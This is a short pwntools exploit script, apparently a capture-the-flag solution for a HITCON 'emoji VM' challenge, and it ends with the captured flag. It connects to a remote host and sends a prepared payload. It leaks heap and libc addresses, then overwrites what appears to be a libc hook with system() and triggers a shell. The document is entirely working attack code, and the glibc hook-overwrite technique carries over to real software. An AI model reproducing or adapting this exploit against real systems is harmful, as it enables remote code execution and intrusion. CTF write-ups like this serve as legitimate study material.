from pwn import *

s = remote('3.115.176.164', 30262)

s.interactive() # solve hashcash challenge
data = open('exploit.bin', 'rb').read()
s.sendline(str(len(data)))
s.send(data)
s.recvuntil('Input your emoji file:\n')

leak = s.recvline().strip()
heapaddr = int(leak)
log.info("heap leak: 0x%x", heapaddr)

def send_cmd(sz, addr, cmd):
    s.send(p64(sz) + p64(addr))
    s.send(chr(cmd).ljust(16, '\0'))

send_cmd(0x8, heapaddr - 0x150, 1)
# _IO_wfile_jumps
libcbase = u64(s.recv(6).ljust(8, '\0')) - 0x3e7d60
log.info("libc base: 0x%x", libcbase)

send_cmd(0x8, libcbase + 0x3ed8e8, 2)
s.send(p64(libcbase + 0x4f440))

send_cmd(0x8, libcbase + 0x001b3e9a, 3)

s.interactive()

# hitcon{H0p3_y0u_Enj0y_pWn1ng_th1S_3m0j1_vM_^_^b}
